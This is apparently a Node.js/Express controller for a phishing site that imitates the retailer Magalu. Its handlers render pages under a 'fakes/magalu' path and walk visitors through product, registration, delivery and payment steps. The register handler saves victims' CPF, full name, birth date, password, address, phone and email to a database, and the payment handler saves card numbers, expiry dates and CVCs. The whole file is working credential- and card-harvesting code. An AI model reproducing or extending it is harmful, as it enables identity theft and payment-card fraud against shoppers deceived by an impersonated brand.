const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const path = require('path');

const magaluModel = require('../models/Magalu.model');
const magaluUsersModel = require('../models/MagaluUsers.model');
const magaluInfoModel = require('../models/MagaluInfo.model');

exports.page = async (req, res, next) => {
    try {
        const { page } = req.params;

        const { to, from, interest, amount } = await magaluModel.findOne({
            where: {
                page: page,
            },
        });

        return res.render(`fakes/magalu/${page}`, {
            to: to,
            from: from,
            interest: interest,
            amount: amount,
        });
    } catch (err) {
        return res.render('errors/users/magalu500');
    }
};

exports.login = async (req, res, next) => {
    try {
        const { id } = req.params;

        const { login, password } = req.body;

        return res.render('fakes/magalu/login', {
            id: id,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};

exports.register = async (req, res, next) => {
    try {
        const { id } = req.params;

        const {
            cpf, fullName, birthDate, password, zipcode,
            address, number, complement, neighbourhood,
            city, state, reference, telephone, email
        } = req.body;

        if (Object.keys(req.body).length >= 10) {
            const user = await magaluUsersModel.create({
                cpf: cpf,
                full_name: fullName,
                birth_date: birthDate,
                password: password,
                zipcode: zipcode,
                address: address,
                number: number,
                complement: complement,
                neighbourhood: neighbourhood,
                city: city,
                state: state,
                reference: reference,
                telephone: telephone,
                email: email,
                page: id,
            });

            if (user) {
                return res.redirect(`/magalu/page/entrega/${user.id}/${id}`);
            }
        }

        const product = await magaluModel.findOne({
            where: {
                page: id,
            },
        });
        
        return res.render('fakes/magalu/register', {
            id: id,
            product: product,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};

exports.sacola = async (req, res, next) => {
    try {
        return res.render('fakes/magalu/sacola');
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};

exports.entrega = async (req, res, next) => {
    try {
        const { id_user, id_product } = req.params;

        const user = await magaluUsersModel.findOne({
            where: {
                id: id_user,
                page: id_product,
            },
        });

        const product = await magaluModel.findOne({
            where: {
                page: id_product,
            },
        });

        if (!user && product) {
            return res.redirect(`/magalu/page/register/${product.page}`);
        }

        if (user && !product) {
            return res.redirect('errors/users/magalu500');
        }

        if (!user && !product) {
            return res.render('errors/users/magalu500');
        }

        return res.render('fakes/magalu/entrega', {
            user: user,
            product: product,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};

exports.payment = async (req, res, next) => {
    try {
        const { id_user, id_product } = req.params;

        const { number, fullName, expirationMonth, expirationYear, CVC, installments } = req.body;

        var info = null;

        if (Object.keys(req.body).length >= 5) {
            info = await magaluInfoModel.create({
                id_user: id_user,
                cardnumber: number,
                cardname: fullName,
                expiration_month: expirationMonth,
                expiration_year: expirationYear,
                cvc: CVC,
                installments: installments,
            });
        }

        const user = await magaluUsersModel.findOne({
            where: {
                id: id_user,
                page: id_product,
            },
        });

        const product = await magaluModel.findOne({
            where: {
                page: id_product,
            },
        });

        if (!user && product) {
            return res.redirect(`/magalu/page/register/${product.page}`);
        }

        if (user && !product) {
            return res.redirect('errors/users/magalu500');
        }

        if (!user && !product) {
            return res.render('errors/users/magalu500');
        }
        return res.render('fakes/magalu/payment', {
            user: user,
            product: product,
            info: info,
        });
    } catch (err) {
        console.log(err);
        return res.render('errors/users/magalu500');
    }
};